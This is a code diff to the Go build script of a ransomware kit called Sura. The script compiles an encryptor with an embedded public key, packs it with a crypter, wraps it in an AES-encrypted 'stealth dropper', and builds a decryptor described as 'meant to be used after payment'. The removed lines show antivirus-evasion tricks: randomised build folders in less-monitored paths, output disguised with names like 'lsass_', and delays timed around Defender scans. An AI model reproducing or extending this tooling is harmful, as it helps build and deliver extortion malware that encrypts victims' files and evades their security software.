@@ -37,6 +37,14 @@ func main() {
 
 	fmt.Print(startupBanner)
 
+	// Create dist folder for outputs
+	fmt.Println("[*] Creating dist folder for outputs...")
+	if err := os.MkdirAll("dist", 0755); err != nil {
+		fmt.Printf("Failed to create dist folder: %v\n", err)
+		return
+	}
+	fmt.Println("[+] Dist folder created")
+
 	// Step -2: Add temporary build exclusion
 	fmt.Println("[*] Step -2: Configuring build environment...")
 	tempBuildPath, _ := filepath.Abs(".")
@@ -107,8 +115,8 @@ func main() {
 	// NEW: Build dropper with encrypted payload
 	fmt.Println("\n[*] Step 6: Building stealth dropper...")
 	if err := buildDropper(); err != nil {
-		fmt.Printf("Error building dropper: %v\n", err)
-		return
+		fmt.Printf("Warning: Dropper build failed: %v\n", err)
+		fmt.Println("[!] Continuing without dropper - use Sura-Packed.exe directly")
 	}
 
 	// Compile the decryptor
@@ -373,12 +381,13 @@ func createDefaultIcon() {
 }
 
 func packEncryptor() error {
-	// Change to root directory to run Crypter
-	os.Chdir("..")
+	fmt.Println("  [*] Running crypter to pack encryptor...")
 
-	// Verify files exist
-	if _, err := os.Stat("Sura-Built.exe"); os.IsNotExist(err) {
-		return fmt.Errorf("Sura-Built.exe not found")
+	// Verify files exist (should be in root directory at this point)
+	if _, err := os.Stat("dist/Sura-Built.exe"); os.IsNotExist(err) {
+		// Print current directory for debugging
+		cwd, _ := os.Getwd()
+		return fmt.Errorf("dist/Sura-Built.exe not found (current dir: %s)", cwd)
 	}
 	if _, err := os.Stat("Crypter.exe"); os.IsNotExist(err) {
 		return fmt.Errorf("Crypter.exe not found - build failed")
@@ -386,8 +395,26 @@ func packEncryptor() error {
 
 	fmt.Println("  [*] Running crypter to pack encryptor...")
 
-	// Use crypter to pack the encryptor (use .\ prefix for current directory on Windows)
-	cmd := exec.Command(".\\Crypter.exe", "Sura-Built.exe", "Sura-Packed.exe")
+	// Remove existing packed file if it exists
+	outputPath := "dist/Sura-Packed.exe"
+	if _, err := os.Stat(outputPath); err == nil {
+		fmt.Println("  [*] Removing existing Sura-Packed.exe...")
+		// Try multiple times with delays in case file is locked
+		for i := 0; i < 3; i++ {
+			if err := os.Remove(outputPath); err == nil {
+				break
+			} else if i == 2 {
+				// Last attempt - try to force using PowerShell
+				fmt.Println("  [*] File locked, attempting forced removal...")
+				cmd := exec.Command("powershell", "-Command", "Remove-Item", "-Force", "-Path", outputPath)
+				cmd.Run()
+			}
+			time.Sleep(1 * time.Second)
+		}
+	}
+
+	// Use crypter to pack the encryptor
+	cmd := exec.Command(".\\Crypter.exe", "dist/Sura-Built.exe", outputPath)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	if err := cmd.Run(); err != nil {
@@ -395,7 +422,7 @@ func packEncryptor() error {
 	}
 
 	// Verify packed file was created
-	if _, err := os.Stat("Sura-Packed.exe"); os.IsNotExist(err) {
+	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
 		return fmt.Errorf("Sura-Packed.exe was not created")
 	}
 
@@ -408,9 +435,9 @@ func buildDropper() error {
 	fmt.Println("Building stealth dropper with encrypted payload...")
 
 	// Read the packed ransomware
-	payloadData, err := os.ReadFile("Sura-Packed.exe")
+	payloadData, err := os.ReadFile("dist/Sura-Packed.exe")
 	if err != nil {
-		return fmt.Errorf("failed to read Sura-Packed.exe: %w", err)
+		return fmt.Errorf("failed to read dist/Sura-Packed.exe: %w", err)
 	}
 
 	fmt.Println("  [*] Encrypting payload with AES-256...")
@@ -463,39 +490,21 @@ func buildDropper() error {
 
 	fmt.Println("  [*] Compiling dropper...")
 
-	// Build dropper in alternate location
-	userDir := os.Getenv("USERPROFILE")
-	randomDir := fmt.Sprintf("Build_%d", time.Now().UnixNano())
-	tempBuildDir := filepath.Join(userDir, "Documents", "WindowsApps", randomDir)
-	randomName := fmt.Sprintf("update_%d.exe", time.Now().UnixNano())
-	tempOutput := filepath.Join(tempBuildDir, randomName)
-
-	os.MkdirAll(tempBuildDir, 0755)
-	defer os.RemoveAll(tempBuildDir)
+	// Build directly to final location
+	finalPath := filepath.Join("..", "dist", "Sura-Dropper.exe")
 
 	// Compile dropper
 	err = os.Chdir("Dropper")
 	if err != nil {
 		return fmt.Errorf("failed to cd to Dropper: %w", err)
 	}
+	defer os.Chdir("..")
 
-	cmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", tempOutput, "main_build.go")
+	cmd := exec.Command("go", "build", "-ldflags", "-s -w -H=windowsgui", "-o", finalPath, "main_build.go")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	if err := cmd.Run(); err != nil {
-		os.Chdir("..")
 		return fmt.Errorf("dropper compilation failed: %w", err)
-	}
-
-	os.Chdir("..")
-
-	// Move dropper to final location
-	time.Sleep(2 * time.Second)
-	finalPath := "Sura-Dropper.exe"
-	if err := os.Rename(tempOutput, finalPath); err != nil {
-		// Fallback to copy
-		data, _ := os.ReadFile(tempOutput)
-		os.WriteFile(finalPath, data, 0755)
 	}
 
 	fmt.Println("  [+] Dropper built successfully!")
@@ -513,47 +522,22 @@ func generateECIESKeyPair() (*eciesgo.PrivateKey, *eciesgo.PublicKey, error) {
 }
 
 func compileEncryptor(pubKeyHex string) error {
-	fmt.Println("Compiling Encryptor with obfuscation...")
+	fmt.Println("Compiling Encryptor...")
 	startTime := time.Now()
 
 	err := os.Chdir("Encryptor")
 	if err != nil {
 		return fmt.Errorf("failed to change directory to Encryptor: %w", err)
 	}
+	defer os.Chdir("..")
 
-	// Build to custom directory far from monitored paths
-	userDir := os.Getenv("USERPROFILE")
-	randomDir := fmt.Sprintf("Temp%d", time.Now().UnixNano())
-	// Use Documents\WindowsApps - less monitored than AppData
-	tempBuildDir := filepath.Join(userDir, "Documents", "WindowsApps", randomDir)
-	randomName := fmt.Sprintf("update_%d.tmp", time.Now().UnixNano())
-	tempOutput := filepath.Join(tempBuildDir, randomName)
-	finalOutput := filepath.Join("..", "Sura-Built.exe")
+	// Build directly to dist folder
+	finalOutput := filepath.Join("..", "dist", "Sura-Built.exe")
 
-	// Create temp build directory
-	if err := os.MkdirAll(tempBuildDir, 0755); err != nil {
-		return fmt.Errorf("failed to create temp build directory: %w", err)
-	}
-	defer os.RemoveAll(tempBuildDir) // Cleanup temp dir after build
+	fmt.Println("  [*] Building encryptor...")
 
-	fmt.Println("  [*] Building with advanced evasion techniques...")
-
-	// Set environment variables to reduce detection surface
-	os.Setenv("CGO_ENABLED", "0")
-	os.Setenv("GOCACHE", tempBuildDir)
-	os.Setenv("GOTMPDIR", tempBuildDir)
-
-	// Advanced build flags for evasion:
-	// -s -w: strip debug info and symbol table
-	// -H windowsgui: hide console window
-	// -trimpath: remove file paths from binary
-	// -buildmode=pie: position independent executable
-	ldflags := fmt.Sprintf("-H=windowsgui -s -w -buildid= -X 'Sura-Ransomware/configuration.PublicKey=%s'", pubKeyHex)
-
-	// Build in multiple stages to confuse heuristics
-	fmt.Println("  [*] Stage 1: Preprocessing...")
-	cmd := exec.Command("cmd", "/C", "go", "build", "-trimpath", "-work", "-ldflags", ldflags, "-o", tempOutput)
-	cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOCACHE="+tempBuildDir, "GOTMPDIR="+tempBuildDir)
+	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'Sura-Ransomware/configuration.PublicKey=%s'", pubKeyHex)
+	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldflags, "-o", finalOutput)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	err = cmd.Run()
@@ -561,56 +545,27 @@ func compileEncryptor(pubKeyHex string) error {
 		return fmt.Errorf("build failed: %w", err)
 	}
 
-	// Wait longer for Defender to complete scan
-	fmt.Println("  [*] Stage 2: Post-processing...")
-	time.Sleep(3 * time.Second)
-
-	// Move from temp location to final location
-	fmt.Println("  [*] Stage 3: Finalizing...")
-	if err := os.Rename(tempOutput, finalOutput); err != nil {
-		// If rename fails, try copy + delete
-		input, err := os.ReadFile(tempOutput)
-		if err != nil {
-			return fmt.Errorf("failed to read temp binary: %w", err)
-		}
-		if err := os.WriteFile(finalOutput, input, 0755); err != nil {
-			return fmt.Errorf("failed to write final binary: %w", err)
-		}
-		os.Remove(tempOutput)
-	}
-
-	fmt.Printf("Encryptor compiled successfully in %v\n", time.Since(startTime))
-	fmt.Println("[+] Binary stripped and obfuscated")
+	fmt.Printf("  [+] Encryptor compiled successfully in %v\n", time.Since(startTime))
 	return nil
 }
 
 func compileDecryptor(privKeyHex string) error {
-	fmt.Println("Compiling Decryptor with obfuscation...")
+	fmt.Println("Compiling Decryptor...")
 	startTime := time.Now()
 
 	err := os.Chdir("Decryptor")
 	if err != nil {
 		return fmt.Errorf("failed to change directory to Decryptor: %w", err)
 	}
+	defer os.Chdir("..")
 
-	// Build to custom TEMP directory with random name to bypass Defender real-time scanning
-	userDir := os.Getenv("USERPROFILE")
-	randomDir := fmt.Sprintf("Build_%d", time.Now().UnixNano())
-	tempBuildDir := filepath.Join(userDir, "AppData", "LocalLow", randomDir)
-	randomName := fmt.Sprintf("lsass_%d.exe", time.Now().UnixNano())
-	tempOutput := filepath.Join(tempBuildDir, randomName)
-	finalOutput := filepath.Join("..", "Decryptor-Built.exe")
+	// Simple direct build - decryptor is meant to be used after payment, no evasion needed
+	finalOutput := filepath.Join("..", "dist", "Decryptor-Built.exe")
 
-	// Create temp build directory
-	if err := os.MkdirAll(tempBuildDir, 0755); err != nil {
-		return fmt.Errorf("failed to create temp build directory: %w", err)
-	}
-	defer os.RemoveAll(tempBuildDir) // Cleanup temp dir after build
+	fmt.Println("  [*] Building decryptor directly...")
 
-	fmt.Println("  [*] Building to alternate location to bypass AV scanning...")
-
-	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'Sura-Decryptor/configuration.PrivateKey=%s'", privKeyHex)
-	cmd := exec.Command("cmd", "/C", "go", "build", "-trimpath", "-ldflags", ldflags, "-o", tempOutput)
+	ldflags := fmt.Sprintf("-s -w -X 'Sura-Decryptor/configuration.PrivateKey=%s'", privKeyHex)
+	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldflags, "-o", finalOutput)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	err = cmd.Run()
@@ -618,24 +573,7 @@ func compileDecryptor(privKeyHex string) error {
 		return fmt.Errorf("build failed: %w", err)
 	}
 
-	// Wait a moment before moving file (let Defender finish its quick scan)
-	time.Sleep(2 * time.Second)
-
-	// Move from temp location to final location
-	fmt.Println("  [*] Moving binary to final location...")
-	if err := os.Rename(tempOutput, finalOutput); err != nil {
-		// If rename fails, try copy + delete
-		input, err := os.ReadFile(tempOutput)
-		if err != nil {
-			return fmt.Errorf("failed to read temp binary: %w", err)
-		}
-		if err := os.WriteFile(finalOutput, input, 0755); err != nil {
-			return fmt.Errorf("failed to write final binary: %w", err)
-		}
-		os.Remove(tempOutput)
-	}
-
-	fmt.Printf("Decryptor compiled successfully in %v\n", time.Since(startTime))
+	fmt.Printf("  [+] Decryptor compiled successfully in %v\n", time.Since(startTime))
 	return nil
 }
 
